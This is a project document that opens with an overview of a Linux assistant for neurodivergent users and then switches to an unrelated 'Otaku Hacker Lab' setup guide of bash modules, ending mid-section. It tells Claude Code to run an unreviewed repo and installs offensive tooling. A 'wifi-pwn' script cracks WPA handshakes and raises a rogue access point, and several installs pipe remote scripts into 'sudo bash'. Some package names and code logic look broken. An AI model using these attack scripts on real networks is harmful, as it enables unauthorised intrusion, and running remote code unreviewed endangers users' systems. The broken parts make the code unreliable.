# Bill Sloth Project: Purpose & Overview

Bill Sloth is a hybrid, local-first Linux assistant for users with ADHD, dyslexia, and memory challenges. It always prefers mature, open-source tools for all workflows, uses custom scripts only as glue or fallback, and continuously audits itself to replace fragile solutions. The project maintains a detailed methods log and documents every change for transparency and maintainability. Claude Code (AI) is used as a guide and fallback for complex or novel problems, with the goal of building user independence and capability over time.

# 【CYBERSPACE】Otaku Hacker Lab セットアップ

## The Smart Approach: Git-Based Modular System

Instead of hoping Claude Code generates things correctly, we'll use a git repo with all the scripts ready to go.

## Step 1: Quick Claude Code Install
```bash
# Node.js + Claude Code
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs
npm install -g @anthropic/claude-code
claude auth login
```

## Step 2: The One-Liner Setup

Tell Claude Code to run this:

```bash
#!/bin/bash
# Otaku Hacker Lab - Git-based installer

# Clone the lab framework
git clone https://github.com/yourusername/otaku-hacker-lab.git ~/OtakuLab
cd ~/OtakuLab
chmod +x lab.sh
./lab.sh
```

---

## What Goes in the Git Repo

### `/lab.sh` - Main Control Interface
```bash
#!/bin/bash
# OTAKU HACKER LAB - MAIN INTERFACE
# "The Matrix has you..." - Morpheus

# Cyber colors
R='\033[0;31m'    # Red (Alert)
G='\033[0;32m'    # Green (Matrix)
B='\033[0;34m'    # Blue (Ice)
P='\033[1;35m'    # Purple (Neon)
C='\033[0;36m'    # Cyan (Ghost)
Y='\033[1;33m'    # Yellow (Warning)
M='\033[0;35m'    # Magenta
W='\033[1;37m'    # White
N='\033[0m'       # Reset

show_banner() {
    clear
    echo -e "${G}"
    cat << 'BANNER'
    ▓█████▄  ▄▄▄       ███▄    █   ▄████ ▓█████  ██▀███  
    ▒██▀ ██▌▒████▄     ██ ▀█   █  ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
    ░██   █▌▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
    ░▓█▄   ▌░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
    ░▒████▓  ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒░▒████▒░██▓ ▒██▒
     ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
     
          Z O N E   【 サイバースペース 】  
    ═══════════════════════════════════════════════════════
BANNER
    echo -e "${N}"
    
    # System status with hacker aesthetic
    echo -e "${C}┌─[${G}SYSTEM ANALYSIS${C}]─────────────────────────────┐${N}"
    echo -e "${C}│${N} CPU: ${G}$(lscpu | grep 'Model name' | cut -d':' -f2 | xargs)${N}"
    echo -e "${C}│${N} RAM: ${G}$(free -h | awk '/^Mem:/ {print $2}')${N} [${Y}$(free -h | awk '/^Mem:/ {print $3}')${N} used]"
    echo -e "${C}│${N} NET: ${G}$(ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1 | head -1)${N}"
    if command -v nvidia-smi &> /dev/null; then
        echo -e "${C}│${N} GPU: ${G}$(nvidia-smi --query-gpu=name --format=csv,noheader)${N}"
    fi
    echo -e "${C}└────────────────────────────────────────────────┘${N}"
}

show_menu() {
    echo -e "\n${P}【OFFENSIVE MODULES】${N}"
    check_module "01" "👹 GHOST SHELL" "Elite pentesting toolkit" "ghost_shell"
    check_module "02" "🔓 ZERO DAY" "Vulnerability research lab" "zero_day"
    check_module "03" "📡 SIGNAL INTEL" "WiFi/Radio/SIGINT tools" "sigint"
    check_module "04" "🕵️ SOCIAL ENGINEER" "OSINT & social tools" "social_eng"
    check_module "05" "🌐 WEB HUNTER" "Web app testing suite" "web_hunter"
    
    echo -e "\n${B}【DEFENSIVE MODULES】${N}"
    check_module "06" "🛡️ FORTRESS" "System hardening & defense" "fortress"
    check_module "07" "👁️ WATCHTOWER" "Monitoring & detection" "watchtower"
    check_module "08" "🔐 CRYPTO SHRINE" "Encryption & privacy" "crypto_shrine"
    
    echo -e "\n${G}【CORE SYSTEMS】${N}"
    check_module "09" "🧠 AI NEXUS" "Local AI/ML infrastructure" "ai_nexus"
    check_module "10" "⚡ NEURAL JACK" "Brain-computer interface (terminal)" "neural_jack"
    check_module "11" "🌸 SAKURA STREAM" "Streaming & content" "streaming"
    check_module "12" "🎨 DIGITAL RAIN" "Creative coding & art" "digital_rain"
    
    echo -e "\n${M}【INFRASTRUCTURE】${N}"
    check_module "13" "🏗️ DOCKER DOJO" "Container orchestration" "docker_dojo"
    check_module "14" "🔧 TOOL FORGE" "Custom tool development" "tool_forge"
    check_module "15" "📊 DATA TOMB" "Databases & big data" "data_tomb"
    check_module "16" "🏴‍☠️ DATA LIBERATION" "Advanced file sharing & archival" "data_liberation"
    check_module "17" "🌊 SEEDBOX STATION" "Remote torrenting infrastructure" "seedbox"
    
    echo -e "\n${R}【DANGER ZONE】${N}"
    echo -e "  ${R}66${N}) 😈 DEMON MODE - Red team tools"
    echo -e "  ${M}77${N}) 🌙 DARK SIDE - Tor, I2P, hidden services"
    echo -e "  ${G}88${N}) 💊 RED PILL - Install EVERYTHING"
    echo -e "  ${R}99${N}) ☠️  CHAOS PROTOCOL - Experimental exploits"
    
    echo -e "\n${W}【UTILITIES】${N}"
    echo -e "   ${C}U${N}) 🔄 Update all modules"
    echo -e "   ${C}B${N}) 💾 Backup configuration"
    echo -e "   ${C}L${N}) 📜 View logs"
    echo -e "   ${C}0${N}) 🚪 Exit the Matrix"
    
    echo -ne "\n${G}root@ghost${N}:${B}~/lab${N}# "
}

check_module() {
    local num=$1
    local name=$2
    local desc=$3
    local module=$4
    
    if [ -f ~/.otaku-lab/${module}.installed ]; then
        echo -e "  ${num}) [${G}ACTIVE${N}] ${name} - ${desc}"
    else
        echo -e "  ${num}) [${R}OFFLINE${N}] ${name} - ${desc}"
    fi
}

install_module() {
    local module=$1
    echo -e "${C}[*] Initializing ${module}...${N}"
    
    if [ -f modules/${module}.sh ]; then
        source modules/${module}.sh
        touch ~/.otaku-lab/${module}.installed
        echo -e "${G}[✓] Module loaded into the Matrix${N}"
    else
        echo -e "${R}[!] Module not found in repository${N}"
        echo -e "${Y}[*] Pulling latest modules...${N}"
        git pull
    fi
}

# Initialize
mkdir -p ~/.otaku-lab/{logs,backups,data}

# Main loop
while true; do
    show_banner
    show_menu
    read -r choice
    
    case $choice in
        0[1-9]|1[0-5]) install_module $(grep -E "^    check_module \"$choice\"" $0 | awk '{print $NF}' | tr -d '"') ;;
        66) install_module "demon_mode" ;;
        77) install_module "dark_side" ;;
        88) 
            echo -e "${R}[!] INITIATING FULL SYSTEM TAKEOVER${N}"
            for module in modules/*.sh; do
                install_module $(basename $module .sh)
            done
            ;;
        99) echo -e "${R}[⚠] CHAOS PROTOCOL NOT YET IMPLEMENTED${N}" ;;
        U|u) 
            echo -e "${C}[*] Updating Otaku Hacker Lab...${N}"
            git pull
            ;;
        B|b)
            tar -czf ~/.otaku-lab/backups/lab-$(date +%Y%m%d-%H%M%S).tar.gz ~/.otaku-lab
            echo -e "${G}[✓] Configuration backed up${N}"
            ;;
        L|l) less ~/.otaku-lab/logs/lab.log ;;
        0) 
            echo -e "${R}[*] Disconnecting from the Matrix...${N}"
            exit 0
            ;;
    esac
    
    echo -e "\n${C}Press Enter to continue...${N}"
    read
done
```

### `/modules/ghost_shell.sh` - Elite Pentesting Toolkit
```bash
#!/bin/bash
# GHOST SHELL - Pentesting Arsenal

echo -e "${R}"
cat << 'BANNER'
     ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓
    ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒
   ▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░
   ░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░ 
   ░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░ 
              S H E L L    
BANNER
echo -e "${N}"

echo -e "${C}[*] Deploying offensive security toolkit...${N}"

# Core pentesting tools
echo -e "${Y}[*] Installing reconnaissance tools...${N}"
sudo apt-get install -y nmap masscan zmap
sudo apt-get install -y enum4linux nikto dirb gobuster
sudo apt-get install -y theharvester recon-ng spiderfoot

echo -e "${Y}[*] Installing exploitation frameworks...${N}"
sudo apt-get install -y metasploit-framework
sudo apt-get install -y sqlmap commix

echo -e "${Y}[*] Installing network attack tools...${N}"
sudo apt-get install -y aircrack-ng kismet
sudo apt-get install -y ettercap-text-only dsniff
sudo apt-get install -y bettercap

echo -e "${Y}[*] Installing password tools...${N}"
sudo apt-get install -y john hashcat hydra
sudo apt-get install -y cewl crunch

# Create command shortcuts
cat > ~/bin/recon << 'EOF'
#!/bin/bash
echo -e "\033[0;32m[RECON MENU]\033[0m"
echo "1) Quick nmap scan"
echo "2) Full port scan" 
echo "3) Web enumeration"
echo "4) SMB enumeration"
echo "5) OSINT gathering"
read -p "> " choice

target=$2
case $choice in
    1) nmap -sV -sC -oA quick_scan $target ;;
    2) nmap -p- -sV -sC -oA full_scan $target ;;
    3) nikto -h $target; dirb http://$target ;;
    4) enum4linux -a $target ;;
    5) theharvester -d $target -b all ;;
esac
EOF
chmod +x ~/bin/recon

# Wordlists
echo -e "${Y}[*] Downloading wordlists...${N}"
sudo apt-get install -y wordlists seclists
mkdir -p ~/wordlists
cd ~/wordlists
wget https://github.com/danielmiessler/SecLists/archive/master.zip
unzip master.zip

echo -e "${G}[✓] Ghost Shell activated${N}"
echo -e "${C}[*] Remember: With great power comes great responsibility${N}"
echo -e "${R}[!] Only use on systems you own or have permission to test${N}"
```

### `/modules/zero_day.sh` - Vulnerability Research
```bash
#!/bin/bash
# ZERO DAY - Vulnerability Research Lab

echo -e "${M}"
cat << 'BANNER'
    ███████╗███████╗██████╗  ██████╗     ██████╗  █████╗ ██╗   ██╗
    ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    ██╔══██╗██╔══██╗╚██╗ ██╔╝
      ███╔╝ █████╗  ██████╔╝██║   ██║    ██║  ██║███████║ ╚████╔╝ 
     ███╔╝  ██╔══╝  ██╔══██╗██║   ██║    ██║  ██║██╔══██║  ╚██╔╝  
    ███████╗███████╗██║  ██║╚██████╔╝    ██████╔╝██║  ██║   ██║   
    ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
BANNER
echo -e "${N}"

# Fuzzing tools
echo -e "${Y}[*] Installing fuzzing frameworks...${N}"
sudo apt-get install -y afl++ zzuf radamsa
pip install boofuzz

# Binary analysis
echo -e "${Y}[*] Installing reverse engineering tools...${N}"
sudo apt-get install -y radare2 gdb peda
sudo apt-get install -y ltrace strace
pip install pwntools ropper

# Install Ghidra
echo -e "${Y}[*] Setting up Ghidra...${N}"
cd /opt
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.4_build/ghidra_10.4_PUBLIC_20230928.zip
unzip ghidra_*.zip
ln -s /opt/ghidra_*/ghidraRun /usr/local/bin/ghidra

# Exploit development
cat > ~/bin/sploit << 'EOF'
#!/bin/bash
echo -e "\033[0;35m[EXPLOIT DEV]\033[0m"
echo "Target binary: $1"
checksec $1
file $1
strings $1 | grep -E '(flag|password|secret)' | head -10
EOF
chmod +x ~/bin/sploit

echo -e "${G}[✓] Zero Day lab initialized${N}"
```

### `/modules/sigint.sh` - Signal Intelligence
```bash
#!/bin/bash
# SIGNAL INTELLIGENCE - Radio & WiFi Hacking

echo -e "${B}"
cat << 'BANNER'
    ░██████╗██╗░██████╗░██╗███╗░░██╗████████╗
    ██╔════╝██║██╔════╝░██║████╗░██║╚══██╔══╝
    ╚█████╗░██║██║░░██╗░██║██╔██╗██║░░░██║░░░
    ░╚═══██╗██║██║░░╚██╗██║██║╚████║░░░██║░░░
    ██████╔╝██║╚██████╔╝██║██║░╚███║░░░██║░░░
    ╚═════╝░╚═╝░╚═════╝░╚═╝╚═╝░░╚══╝░░░╚═╝░░░
BANNER
echo -e "${N}"

# WiFi tools
echo -e "${Y}[*] Installing WiFi hacking tools...${N}"
sudo apt-get install -y aircrack-ng reaver pixiewps
sudo apt-get install -y wifite2 fern-wifi-cracker
sudo apt-get install -y kismet wifi-honey

# SDR tools
echo -e "${Y}[*] Installing SDR tools...${N}"
sudo apt-get install -y rtl-sdr gqrx-sdr
sudo apt-get install -y gnuradio gr-osmosdr
sudo apt-get install -y inspectrum urh

# Bluetooth
sudo apt-get install -y bluez bluetooth
sudo apt-get install -y bluesnarfer bluelog spooftooph

# Create WiFi attack script
cat > ~/bin/wifi-pwn << 'EOF'
#!/bin/bash
echo -e "\033[0;36m[WIFI ATTACK VECTOR]\033[0m"
echo "1) Monitor mode"
echo "2) Scan networks"
echo "3) Capture handshake"
echo "4) Crack WPA/WPA2"
echo "5) Rogue AP"
read -p "> " choice

interface=${2:-wlan0}
case $choice in
    1) airmon-ng start $interface ;;
    2) airodump-ng ${interface}mon ;;
    3) echo "Enter BSSID:"; read bssid
       airodump-ng -c 6 --bssid $bssid -w capture ${interface}mon ;;
    4) aircrack-ng -w ~/wordlists/rockyou.txt capture*.cap ;;
    5) airbase-ng -e "FREE_WIFI" -c 6 ${interface}mon ;;
esac
EOF
chmod +x ~/bin/wifi-pwn

echo -e "${G}[✓] SIGINT capabilities online${N}"
```

### `/modules/data_liberation.sh` - Safe Torrenting & File Sharing
```bash
#!/bin/bash
# DATA LIBERATION - Advanced File Sharing & Archival
# "Information wants to be free" - But safely!

echo -e "${Y}"
cat << 'BANNER'
    ██████╗  █████╗ ████████╗ █████╗     ██╗     ██╗██████╗ 
    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗    ██║     ██║██╔══██╗
    ██║  ██║███████║   ██║   ███████║    ██║     ██║██████╔╝
    ██║  ██║██╔══██║   ██║   ██╔══██║    ██║     ██║██╔══██╗
    ██████╔╝██║  ██║   ██║   ██║  ██║    ███████╗██║██████╔╝
    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚══════╝╚═╝╚═════╝ 
         
    【解放】 L I B E R A T I O N   P R O T O C O L 【共有】
    ═══════════════════════════════════════════════════════
BANNER
echo -e "${N}"

echo -e "${R}[!] LEGAL NOTICE: Only download content you have rights to access${N}"
echo -e "${R}[!] This module is for Linux ISOs, Public Domain content, and legal archival${N}"
sleep 3

# Install torrent clients
echo -e "${Y}[*] Installing torrent clients...${N}"
sudo apt-get install -y qbittorrent transmission-cli transmission-daemon
sudo apt-get install -y deluge rtorrent

# Install VPN support
echo -e "${Y}[*] Installing VPN infrastructure...${N}"
sudo apt-get install -y openvpn wireguard network-manager-openvpn-gnome
curl -fsSL https://raw.githubusercontent.com/ProtonVPN/linux-cli/master/protonvpn.sh | sudo bash

# Install safety tools
echo -e "${Y}[*] Installing safety & privacy tools...${N}"
sudo apt-get install -y tor torsocks proxychains4
pip install trackerslist

# Create VPN kill switch
cat > ~/bin/vpn-killswitch << 'EOF'
#!/bin/bash
echo -e "\033[0;31m[VPN KILL SWITCH]\033[0m"
echo "This will block all traffic except through VPN"
echo "Continue? (y/n)"
read -r confirm
if [[ $confirm == "y" ]]; then
    # Get VPN interface
    vpn_if=$(ip addr | grep -E "tun|wg" | grep -oP '^\d+: \K[^:]+' | head -1)
    if [ -z "$vpn_if" ]; then
        echo "No VPN detected!"
        exit 1
    fi
    
    # Flush existing rules
    sudo iptables -F
    sudo iptables -X
    
    # Default policies
    sudo iptables -P INPUT DROP
    sudo iptables -P FORWARD DROP
    sudo iptables -P OUTPUT DROP
    
    # Allow loopback
    sudo iptables -A INPUT -i lo -j ACCEPT
    sudo iptables -A OUTPUT -o lo -j ACCEPT
    
    # Allow VPN
    sudo iptables -A OUTPUT -o $vpn_if -j ACCEPT
    sudo iptables -A INPUT -i $vpn_if -j ACCEPT
    
    # Allow VPN connection
    sudo iptables -A OUTPUT -p udp --dport 1194 -j ACCEPT
    sudo iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
    
    echo -e "\033[0;32m[✓] Kill switch active on $vpn_if\033[0m"
fi
EOF
chmod +x ~/bin/vpn-killswitch

# qBittorrent configuration
mkdir -p ~/.config/qBittorrent
cat > ~/.config/qBittorrent/qBittorrent.conf << 'EOF'
[Preferences]
# Safety settings
Connection\GlobalDLLimit=0
Connection\GlobalUPLimit=500
Connection\PortRangeMin=49152
Downloads\SavePath=/home/$USER/Downloads/Torrents/
General\UseRandomPort=true
WebUI\Enabled=true
WebUI\Port=8080

# Privacy settings
Advanced\AnnounceToAllTrackers=true
Advanced\AnonymousMode=true
BitTorrent\DHT=false
BitTorrent\LSD=false
BitTorrent\PeX=false
BitTorrent\Encryption=2
EOF

# Private tracker guide
cat > ~/OtakuLab/data/private_tracker_guide.md << 'EOF'
# Private Tracker Safety Guide

## Why Private Trackers?
- Better security (no randoms)
- Quality control
- Community standards
- Less legal risk
- Better speeds

## Top Anime/Japanese Content Trackers
1. **AnimeBytes (AB)** - The holy grail of anime
2. **Nyaa.si** - Public but reliable (use VPN!)
3. **BakaBT** - Curated anime/manga

## General Private Trackers
1. **RED** - Music (FLAC paradise)
2. **MAM** - Books/Audiobooks
3. **TL** - General content
4. **IPT** - Large general tracker

## Getting Into Private Trackers
1. **Interview** - RED and MAM have IRC interviews
2. **Invites** - Build ratio on easier trackers first
3. **Open signups** - Check /r/OpenSignups
4. **Recruitment** - Power User forums on other trackers

## Essential Rules
1. **NEVER trade/sell invites** - Instant ban
2. **Maintain ratio** - Seed everything
3. **Read the rules** - Each tracker is different
4. **Use the same username** - Build reputation
5. **Don't cheat** - They WILL catch you

## Safety Protocol
1. VPN for public trackers ONLY (most private trackers ban VPN on browse)
2. Seedbox for building ratio
3. Separate email for trackers
4. Strong unique passwords
5. 2FA when available
EOF

# Create tracker management script
cat > ~/bin/tracker-safe << 'EOF'
#!/bin/bash
echo -e "\033[0;33m[TRACKER SAFETY CHECK]\033[0m"
echo "1) Test VPN connection"
echo "2) Check torrent client binding"
echo "3) View IP leak test"
echo "4) Configure proxy chains"
echo "5) Seedbox quick connect"
read -p "> " choice

case $choice in
    1) 
        echo "Current IP: $(curl -s ifconfig.me)"
        echo "VPN status:"
        if ip addr | grep -q "tun\|wg"; then
            echo -e "\033[0;32m[✓] VPN Connected\033[0m"
        else
            echo -e "\033[0;31m[✗] VPN Disconnected!\033[0m"
        fi
        ;;
    2)
        echo "qBittorrent network interface:"
        grep -E "Connection\\\\Interface" ~/.config/qBittorrent/qBittorrent.conf || echo "Not bound to specific interface!"
        ;;
    3)
        xdg-open "https://ipleak.net"
        ;;
    4)
        sudo nano /etc/proxychains4.conf
        ;;
    5)
        echo "Seedbox SSH quick connect..."
        # Add your seedbox details
        ;;
esac
EOF
chmod +x ~/bin/tracker-safe

# Install autodl-irssi for racing
echo -e "${Y}[*] Setting up autodl-irssi for racing...${N}"
mkdir -p ~/.irssi/scripts/autorun
cd ~/.irssi/scripts
wget -O autodl-irssi.zip https://github.com/autodl-community/autodl-irssi/releases/latest/download/autodl-irssi.zip
unzip autodl-irssi.zip
rm autodl-irssi.zip
cd autorun
ln -s ../autodl-irssi.pl

# Create ratio management tool
cat > ~/bin/ratio-manager << 'EOF'
#!/bin/bash
echo -e "\033[0;36m[RATIO MANAGER]\033[0m"
echo "Current torrents:"
transmission-remote -l 2>/dev/null || echo "Transmission not running"
echo ""
echo "Storage space:"
df -h ~/Downloads/Torrents/
echo ""
echo "Top trackers:"
grep -h "tracker" ~/.config/qBittorrent/BT_backup/*.fastresume 2>/dev/null | sort | uniq -c | sort -nr | head -10
EOF
chmod +x ~/bin/ratio-manager

echo -e "${G}[✓] Data Liberation module configured${N}"
echo -e "${Y}[*] Read ~/OtakuLab/data/private_tracker_guide.md for safety${N}"
echo -e "${R}[!] Remember: VPN for public trackers, raw connection for private${N}"
```

### `/modules/seedbox.sh` - Remote Seedbox Setup
```bash
#!/bin/bash
# SEEDBOX STATION - Remote Torrenting Infrastructure

echo -e "${C}"
cat << 'BANNER'
    ███████╗███████╗███████╗██████╗ ██████╗  ██████╗ ██╗  ██╗
    ██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝
    ███████╗█████╗  █████╗  ██║  ██║██████╔╝██║   ██║ ╚███╔╝ 
    ╚════██║██╔══╝  ██╔══╝  ██║  ██║██╔══██╗██║   ██║ ██╔██╗ 
    ███████║███████╗███████╗██████╔╝██████╔╝╚██████╔╝██╔╝ ██╗
    ╚══════╝╚══════╝╚══════╝╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
              S T A T I O N   【遠隔】
BANNER
echo -e "${N}"

# Install seedbox management tools
echo -e "${Y}[*] Installing seedbox tools...${N}"
sudo apt-get install -y rsync lftp sshfs
pip install flexget

# Create seedbox sync script
cat > ~/bin/seedsync << 'EOF'
#!/bin/bash
# Seedbox sync configuration
SEEDBOX_USER="your_username"
SEEDBOX_HOST="your.seedbox.com"
SEEDBOX_PATH="/home/$SEEDBOX_USER/downloads/complete"
LOCAL_PATH="$HOME/Downloads/Seedbox"

echo -e "\033[0;36m[SEEDBOX SYNC]\033[0m"
echo "1) Mount seedbox (SSHFS)"
echo "2) Sync completed downloads"
echo "3) Sync with filters"
echo "4) Upload torrent files"
echo "5) Check seedbox stats"
read -p "> " choice

case $choice in
    1)
        mkdir -p ~/Seedbox
        sshfs $SEEDBOX_USER@$SEEDBOX_HOST:/ ~/Seedbox
        echo "Mounted at ~/Seedbox"
        ;;
    2)
        rsync -avzP $SEEDBOX_USER@$SEEDBOX_HOST:$SEEDBOX_PATH/ $LOCAL_PATH/
        ;;
    3)
        echo "Enter filter (e.g., *.mkv):"
        read filter
        rsync -avzP --include="$filter" --exclude="*" $SEEDBOX_USER@$SEEDBOX_HOST:$SEEDBOX_PATH/ $LOCAL_PATH/
        ;;
    4)
        echo "Upload .torrent files from ~/Downloads/watch"
        rsync -avz ~/Downloads/watch/*.torrent $SEEDBOX_USER@$SEEDBOX_HOST:~/watch/
        ;;
    5)
        ssh $SEEDBOX_USER@$SEEDBOX_HOST 'df -h; free -h; transmission-remote -l | tail -20'
        ;;
esac
EOF
chmod +x ~/bin/seedsync

# Create Flexget config for automation
mkdir -p ~/.config/flexget
cat > ~/.config/flexget/config.yml << 'EOF'
tasks:
  anime-rss:
    rss: 
      url: YOUR_PRIVATE_TRACKER_RSS_HERE
    accept_all: yes
    download: 
      path: ~/Downloads/watch/
      
  sync-seedbox:
    filesystem:
      path: ~/Downloads/Seedbox/
    accept_all: yes
    exec:
      on_output:
        for_accepted: |
          notify-send "Download Complete" "{{title}}"

schedules:
  - tasks: ['anime-rss']
    interval:
      minutes: 30
  - tasks: ['sync-seedbox']
    interval:
      hours: 1
EOF

# Docker-based seedbox
cat > ~/OtakuLab/docker/seedbox-compose.yml << 'EOF'
version: '3'
services:
  rtorrent:
    image: linuxserver/rutorrent
    container_name: rutorrent
    environment:
      - PUID=1000
      - PGID=1000
    volumes:
      - ./config:/config
      - ./downloads:/downloads
    ports:
      - 8080:80
      - 5000:5000
      - 51413:51413
      - 6881:6881/udp
    restart: unless-stopped
    
  jackett:
    image: linuxserver/jackett
    container_name: jackett
    environment:
      - PUID=1000
      - PGID=1000
      - AUTO_UPDATE=true
    volumes:
      - ./jackett:/config
    ports:
      - 9117:9117
    restart: unless-stopped
    
  sonarr:
    image: linuxserver/sonarr
    container_name: sonarr
    environment:
      - PUID=1000
      - PGID=1000
    volumes:
      - ./sonarr:/config
      - ./downloads:/downloads
      - ./tv:/tv
    ports:
      - 8989:8989
    restart: unless-stopped
EOF

echo -e "${G}[✓] Seedbox station configured${N}"
echo -e "${Y}[*] Edit ~/bin/seedsync with your seedbox details${N}"
echo -e "${C}[*] For local Docker seedbox: docker-compose -f ~/OtakuLab/docker/seedbox-compose.yml up -d${N}"
```

### Update aliases.sh with torrenting shortcuts
```bash
# Torrenting aliases
alias ratio='transmission-remote -l'
alias seed-add='transmission-remote -a'
alias seed-list='transmission-remote -l'
alias vpn-check='curl -s ifconfig.me; echo " <- Your IP (should be VPN)"'
alias tracker-check='~/bin/tracker-safe'
alias magnet='aria2c --enable-dht=true --bt-enable-lpd=true'

# Safety aliases
alias torrent-stop='sudo systemctl stop transmission-daemon qbittorrent'
alias torrent-start='if ip addr | grep -q "tun\|wg"; then sudo systemctl start transmission-daemon qbittorrent; else echo "Start VPN first!"; fi'

# Quick downloads
alias yt='yt-dlp'
alias yt-audio='yt-dlp -x --audio-format mp3'
alias wget-mirror='wget -mkEpnp'
```

### `/modules/neural_jack.sh` - Ultimate Terminal Enhancement
```bash
#!/bin/bash
# NEURAL JACK - Brain-Computer Interface (Terminal Edition)

echo -e "${G}"
cat << 'BANNER'
    ███╗   ██╗███████╗██╗   ██╗██████╗  █████╗ ██╗     
    ████╗  ██║██╔════╝██║   ██║██╔══██╗██╔══██╗██║     
    ██╔██╗ ██║█████╗  ██║   ██║██████╔╝███████║██║     
    ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██╔══██║██║     
    ██║ ╚████║███████╗╚██████╔╝██║  ██║██║  ██║███████╗
    ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
         J A C K   I N   【脳接続】
BANNER
echo -e "${N}"

# Install advanced terminals
echo -e "${Y}[*] Installing neural interface terminals...${N}"
sudo apt-get install -y alacritty kitty wezterm

# Shell enhancement
echo -e "${Y}[*] Installing consciousness expansion shells...${N}"
sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k

# Terminal multiplexer
echo -e "${Y}[*] Installing reality splitter...${N}"
sudo apt-get install -y tmux
git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm

# Create cyberpunk tmux config
cat > ~/.tmux.conf << 'EOF'
# Neural Jack Tmux Config
set -g default-terminal "screen-256color"
set -g status-bg black
set -g status-fg green
set -g status-left '#[fg=cyan]【#S】'
set -g status-right '#[fg=yellow]【%H:%M】'
set -g pane-border-style fg=magenta
set -g pane-active-border-style fg=cyan

# Keybindings
bind-key v split-window -h
bind-key s split-window -v
bind h select-pane -L
bind j select-pane -D
bind k select-pane -U
bind l select-pane -R
EOF

# Matrix effect
sudo apt-get install -y cmatrix hollywood

# Create the neural jack command
cat > ~/bin/jack-in << 'EOF'
#!/bin/bash
echo -e "\033[0;32m[JACKING IN...]\\033[0m"
sleep 1
tmux new-session -d -s neural
tmux send-keys -t neural 'cmatrix -b' C-m
tmux split-window -h -t neural
tmux send-keys -t neural 'htop' C-m
tmux split-window -v -t neural
tmux send-keys -t neural 'watch -n1 "date +%T | figlet -f small"' C-m
tmux attach -t neural
EOF
chmod +x ~/bin/jack-in

echo -e "${G}[✓] Neural interface ready. Run 'jack-in' to connect${N}"
```

### `/modules/fortress.sh` - System Hardening
```bash
#!/bin/bash
# FORTRESS - System Defense & Hardening

echo -e "${B}"
cat << 'BANNER'
    ███████╗ ██████╗ ██████╗ ████████╗██████╗ ███████╗███████╗███████╗
    ██╔════╝██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝
    █████╗  ██║   ██║██████╔╝   ██║   ██████╔╝█████╗  ███████╗███████╗
    ██╔══╝  ██║   ██║██╔══██╗   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║
    ██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗███████║███████║
    ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
BANNER
echo -e "${N}"

# Firewall
echo -e "${Y}[*] Configuring firewall...${N}"
sudo apt-get install -y ufw fail2ban
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw --force enable

# Security auditing
echo -e "${Y}[*] Installing security audit tools...${N}"
sudo apt-get install -y lynis rkhunter chkrootkit
sudo apt-get install -y aide tripwire
sudo apt-get install -y auditd

# Intrusion detection
echo -e "${Y}[*] Setting up intrusion detection...${N}"
sudo apt-get install -y snort suricata
sudo apt-get install -y ossec-hids-server

# Create security check script
cat > ~/bin/sec-check << 'EOF'
#!/bin/bash
echo -e "\033[0;34m[SECURITY AUDIT]\033[0m"
echo "1) Full system audit (Lynis)"
echo "2) Rootkit scan"
echo "3) Check listening ports"
echo "4) Review auth logs"
echo "5) Active connections"
read -p "> " choice

case $choice in
    1) sudo lynis audit system ;;
    2) sudo rkhunter --check; sudo chkrootkit ;;
    3) sudo netstat -tulpn ;;
    4) sudo tail -50 /var/log/auth.log ;;
    5) sudo netstat -tupn ;;
esac
EOF
chmod +x ~/bin/sec-check

echo -e "${G}[✓] Fortress defenses activated${N}"
```

### `/aliases.sh` - Hacker Aliases
```bash
# Hacker aliases
alias hack='echo "Accessing mainframe..." && sleep 2 && echo "Access granted."'
alias matrix='cmatrix -b -C green'
alias l33t='echo $@ | tr "aeiostlAEIOSTL" "4310571431057L"'

# Pentesting shortcuts
alias nmap-quick='nmap -sV -sC -O -T4'
alias nmap-full='nmap -sV -sC -O -p- -T4'
alias serve-http='python3 -m http.server 8080'
alias serve-ftp='python3 -m pyftpdlib -p 2121'

# Network shortcuts
alias myip='curl ifconfig.me'
alias ports='netstat -tulpn'
alias listening='lsof -i -P -n | grep LISTEN'

# Quick exploits
